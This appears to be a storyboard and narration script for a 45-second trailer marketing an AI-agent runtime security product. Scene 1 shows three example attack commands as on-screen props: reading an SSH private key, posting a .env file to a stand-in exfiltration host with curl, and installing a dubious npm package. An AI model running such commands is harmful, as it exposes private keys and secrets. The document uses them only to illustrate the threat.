# OpenSyber Product Trailer Storyboard

**Duration**: 45 seconds | **Resolution**: 1920x1080 | **Frame Rate**: 24fps
**Tone**: Operator voice — calm, confident, mission control. No hype.

---

## Technical Specifications

| Property | Value |
|---|---|
| Aspect Ratio | 16:9 |
| Resolution | 1920x1080 (Full HD) |
| Frame Rate | 24fps |
| Color Space | sRGB / Rec. 709 |
| Export Format | H.264 (MP4), ProRes 422 (master) |

### Color Grading Notes

- **Primary palette**: #00E5C3 (teal signal), #080B0F (void black), white text
- **Accent colors**: Red #EF4444 (alerts/threats), Amber #F59E0B (warnings), Blue #3B82F6 (info)
- **Grade style**: High contrast, desaturated mid-tones, lifted blacks to ~5% (never true black on screen)
- **Glow treatment**: Teal elements carry a soft 20px bloom. Red elements pulse with a 2px outer glow.
- **Vignette**: Subtle radial vignette on all shots (20% opacity, edge fall-off)
- **Film grain**: Fine digital grain at 5% opacity to add texture to flat UI shots

### Typography On-Screen

| Use | Font | Weight | Tracking |
|---|---|---|---|
| Headlines / Titles | Bebas Neue | Regular | 0.05em |
| Code / Labels | Space Mono | Regular | 0.02em |
| Body / Subtitles | DM Sans | Medium | Normal |

---

## Scene Breakdown

---

### Scene 1: THE HOOK

**Timestamp**: 0:00 - 0:05

**Visual Description**:
Black screen. A single terminal cursor blinks twice in the center of the frame. Then, three lines of monospaced text type themselves out rapidly:

```
$ agent exec --tool=shell "cat ~/.ssh/id_rsa"
$ curl -s https://exfil.bad/collect -d @.env
$ npm install totally-legit-pkg@latest
```

Each line appears in dim red (#EF4444 at 60% opacity). As the third line completes, the entire terminal glitches — a brief CRT-style horizontal tear — and the text dissolves into particles that scatter outward.

**Text Overlay**: None (the terminal commands ARE the text)

**Narration / VO**:
"Your AI agent has root access. It can read your keys, exfiltrate your data, and install anything it wants."

**Music / SFX**:
- Deep sub-bass drone begins (30Hz, building)
- Mechanical keyboard sounds on each character type
- Glitch: short digital distortion burst (0.3s)

**Transition**: Particle dissolve into black

---

### Scene 2: THE PROBLEM

**Timestamp**: 0:05 - 0:12

**Visual Description**:
Quick montage of four threat cards, each appearing for ~1.5 seconds. Cards slide in from the right, stack slightly, and glow with a red edge pulse:

1. Terminal icon + "Arbitrary Code Execution" — brief code scroll in background
2. File icon + "68% store keys in plaintext" — a .env file flashes on screen
3. Globe icon + "Unrestricted Network Access" — network graph with outbound arrows to unknown IPs
4. Warning icon + "No Audit Trail" — an empty log viewer, cursor blinking in void

Each card has the threat title in Bebas Neue (white) and a one-line stat in Space Mono (red). The background shows a faint, slowly rotating wireframe globe with red connection lines.

**Text Overlay**:
- Card 1: "ARBITRARY CODE EXECUTION"
- Card 2: "68% OF AGENTS EXPOSE CREDENTIALS"
- Card 3: "UNRESTRICTED OUTBOUND NETWORK"
- Card 4: "ZERO AUDIT TRAIL"

**Narration / VO**:
"Most platforms give agents full privileges and zero monitoring. No firewall. No audit log. No visibility."

**Music / SFX**:
- Bass drone continues, adds a slow heartbeat pulse (60 BPM)
- Each card entrance: short metallic impact sound
- Subtle alert chime on "68%" stat

**Transition**: Cards collapse inward to a single point of teal light

---

### Scene 3: THE REVEAL

**Timestamp**: 0:12 - 0:25

**Visual Description**:
The teal point of light expands into the OpenSyber crosshair logo, which holds for 1 second, then pulls back to reveal the full dashboard.

**0:13 - 0:15**: Logo reveal. The crosshair draws itself stroke by stroke in teal (#00E5C3). "OPEN//SYBER" wordmark fades in below. Tagline appears: "Runtime Security for AI Agents" in Space Mono, small, tracked wide.

**0:15 - 0:20**: Camera pushes into a browser frame showing the actual dashboard. The security score gauge animates from 0 to 87. Three metric cards populate: "3/5 Agents", "12 Threats Blocked", "99.9% Uptime". The live event feed scrolls:
- `CRITICAL` — Credential exfiltration blocked
- `INFO` — Skill audit passed (osquery-monitor v2.1)
- `OK` — Heartbeat restored (agent-prod-3)

**0:20 - 0:25**: Camera slowly pans across the dashboard. We see the sidebar nav, the security score ring pulsing, and a threat being blocked in real-time (a red card flashes, then fades to "RESOLVED" in teal). The UI is dark, clean, teal accents — the actual product.

**Text Overlay**:
- 0:13: "OPEN//SYBER" (Bebas Neue, centered)
- 0:14: "Runtime Security for AI Agents" (Space Mono, small, below logo)
- 0:20: "DEPLOY IN 60 SECONDS" (Bebas Neue, bottom-left corner badge)

**Narration / VO**:
"OpenSyber. Runtime security for AI agents. Deploy a hardened agent in 60 seconds. Monitor every file access, network call, and credential use — in real time."

**Music / SFX**:
- At logo reveal: a clean, resonant chime (teal = clarity)
- Bass drone resolves into a confident, minimal electronic beat (100 BPM)
- UI sounds: soft clicks as metrics populate, subtle whoosh on score animation
- Threat blocked: short two-tone alert, then resolution chime

**Transition**: Smooth zoom into dashboard, then match-cut to feature cards

---

### Scene 4: THREE DIFFERENTIATORS

**Timestamp**: 0:25 - 0:35

**Visual Description**:
Three feature panels appear side by side, each with an icon, title, and three bullet points. They animate in with a stagger (0.15s delay each), sliding up from below with a subtle parallax depth effect.

**Panel 1 (0:25 - 0:28)**: Blue-tinted card
- Icon: Server (hardened container illustration)
- Title: "HARDENED INFRASTRUCTURE"
- Bullets appear one by one:
  - Read-only containers, encrypted vault
  - Deny-by-default firewall
  - Same-day CVE patching

**Panel 2 (0:28 - 0:31)**: Green-tinted card
- Icon: Checkmark shield (marketplace illustration)
- Title: "VERIFIED SKILL MARKETPLACE"
- Bullets:
  - Multi-stage security audit
  - Signed packages, tamper-evident
  - Permission declarations

**Panel 3 (0:31 - 0:35)**: Purple-tinted card
- Icon: Eye/dashboard (monitoring illustration)
- Title: "REAL-TIME SECURITY DASHBOARD"
- Bullets:
  - Security score across 8 categories
  - Anomaly detection + instant alerts
  - SOC2 / ISO 27001 reports

Each panel has a thin border that glows in its accent color. Background: the void black with very faint grid lines receding to a vanishing point.

**Text Overlay**:
- Panel titles in Bebas Neue (white)
- Bullet text in DM Sans (gray-300)
- Each panel number in Space Mono, top-right corner: "01", "02", "03"

**Narration / VO**:
"Hardened infrastructure with encrypted vaults and zero-trust networking. A verified skill marketplace where every package is audited. And a real-time dashboard that scores your security posture across eight categories."

**Music / SFX**:
- Beat continues, steady and confident
- Each panel entrance: subtle glass tap
- Bullet points: very soft tick sound

**Transition**: Panels shrink and arrange into a triptych, then fade

---

### Scene 5: SOCIAL PROOF

**Timestamp**: 0:35 - 0:40

**Visual Description**:
Dark background. Three large metrics animate in using a counting-up effect (like an odometer). They appear in a horizontal row, each with a label below in Space Mono:

```
100+          10K+          99.9%
AGENTS        THREATS       UPTIME
DEPLOYED      BLOCKED       SLA
```

The numbers count up from zero. Each number is in Bebas Neue at ~120px, teal color. Labels below in Space Mono, 14px, white at 60% opacity.

Below the metrics, a trust bar fades in: four badges in a row:
- "ZERO TRUST ARCHITECTURE"
- "CLOUDFLARE EDGE"
- "SOC2 READY"
- "GDPR COMPLIANT"

**Text Overlay**: The metrics and badges ARE the text overlay.

**Narration / VO**:
"Trusted by teams running production agents. Zero trust architecture on Cloudflare's edge."

**Music / SFX**:
- Counting sound: soft digital increment ticks
- Badge appear: quiet metallic seal sound
- Music: beat drops to just the bass and a sustained pad

**Transition**: Metrics fade down, void closes in

---

### Scene 6: CALL TO ACTION

**Timestamp**: 0:40 - 0:45

**Visual Description**:
Black screen. The crosshair logo fades in at center, smaller than before. Below it:

Line 1: "OPEN//SYBER" in Bebas Neue, tracked wide
Line 2: "opensyber.cloud" in Space Mono, teal, with a subtle underline animation
Line 3: "Free forever. No credit card." in DM Sans, white at 50% opacity

A teal CTA button animates in: "START SECURING YOUR AGENTS" in Space Mono, uppercase, black text on teal background. The button has the same hover glow treatment from the website (shadow: 0 0 20px rgba(0,229,195,0.3)).

The final frame holds for 2 seconds. A "Product Hunt" badge fades in at bottom-right corner.

**Text Overlay**:
- "OPEN//SYBER" — Bebas Neue, white, centered
- "opensyber.cloud" — Space Mono, teal (#00E5C3), centered
- "Free forever. No credit card." — DM Sans, white 50%, centered
- CTA button: "START SECURING YOUR AGENTS"

**Narration / VO**:
"Start free at opensyber.cloud."

**Music / SFX**:
- Beat resolves to a single sustained teal-toned chord
- Logo appear: the same clarity chime from Scene 3
- Final beat: one clean kick drum hit as URL appears, then silence
- Last 1.5s: complete silence (let the CTA breathe)

**Transition**: Hold on final frame. Hard cut to black at 0:45.

---

## Full Narration Script (continuous)

> Your AI agent has root access. It can read your keys, exfiltrate your data, and install anything it wants.
>
> Most platforms give agents full privileges and zero monitoring. No firewall. No audit log. No visibility.
>
> OpenSyber. Runtime security for AI agents. Deploy a hardened agent in 60 seconds. Monitor every file access, network call, and credential use — in real time.
>
> Hardened infrastructure with encrypted vaults and zero-trust networking. A verified skill marketplace where every package is audited. And a real-time dashboard that scores your security posture across eight categories.
>
> Trusted by teams running production agents. Zero trust architecture on Cloudflare's edge.
>
> Start free at opensyber.cloud.

**Total word count**: ~115 words
**Speaking pace**: ~155 WPM (calm, deliberate — not rushed)
**VO direction**: Male or female, mid-30s register. Calm and authoritative. Think documentary narrator, not sales pitch. Slight pauses between sentences. No vocal fry. No upspeak.

---

## Soundtrack

### Recommended Music Style

Minimal dark electronic. Think Trent Reznor scoring a cybersecurity documentary. Clean percussion, sub-bass foundation, sparse melodic elements in minor key. No drops. No EDM builds. Tension that resolves into quiet confidence.

Reference tracks:
- Trent Reznor & Atticus Ross — "Hand Covers Bruise" (The Social Network)
- Cliff Martinez — "Wanna Fight" (Drive)
- Max Richter — "On the Nature of Daylight" (arrival-style tension)

### Suno AI Prompt

```
Dark minimal electronic, cybersecurity trailer, 45 seconds.

Start with deep sub-bass drone and mechanical tension (0-12s).
Transition to confident minimal beat at 100 BPM with clean kick and hi-hats (12-35s).
Resolve to sustained pad chord and silence (35-45s).

Instruments: analog synth bass, granular textures, metallic percussion, clean sine-wave pads.
No vocals. No drops. No build-ups.
Mood: mission control, calm authority, dark clarity.
Key: D minor.
Tempo: 100 BPM (main section).
Style: Trent Reznor, Cliff Martinez, dark documentary score.
```

### Alternate Suno Prompt (shorter)

```
45-second dark electronic trailer score, D minor, 100 BPM. Sub-bass drone intro, minimal beat middle section, resolving pad outro. Cybersecurity mood — tense then confident. No vocals, no drops. Trent Reznor style.
```

---

## Production Notes

### Screen Recordings Needed

1. **Dashboard overview** — security score, metric cards, event feed (Scene 3)
2. **Threat blocked** — real-time alert appearing and resolving (Scene 3)
3. **Skill marketplace** — browsing verified skills (Scene 4, background)
4. **Deploy flow** — clicking deploy, watching agent provision (Scene 3, optional)

### Motion Design Assets

1. Crosshair logo animation (SVG stroke draw)
2. Terminal typing effect with cursor
3. Particle dissolve transition
4. Score gauge animation (0 to 87)
5. Number counter (odometer style)
6. Card entrance animations (slide up + fade)
7. CRT glitch effect (horizontal tear)

### Recommended Tools

| Task | Tool |
|---|---|
| Motion graphics | After Effects or Motion |
| Screen recording | OBS or ScreenFlow |
| Color grading | DaVinci Resolve |
| Sound design | Logic Pro or Audacity |
| Music generation | Suno AI |
| VO generation | ElevenLabs (or human VO) |
| Export | Media Encoder (H.264 + ProRes) |

### Accessibility

- All text on screen meets WCAG AA contrast (teal on dark passes at the sizes used)
- VO narration covers all visual information (no visual-only messaging)
- Captions/subtitles track to be produced alongside final cut
- No flashing content exceeding 3 flashes per second (the glitch in Scene 1 is a single 0.3s event)
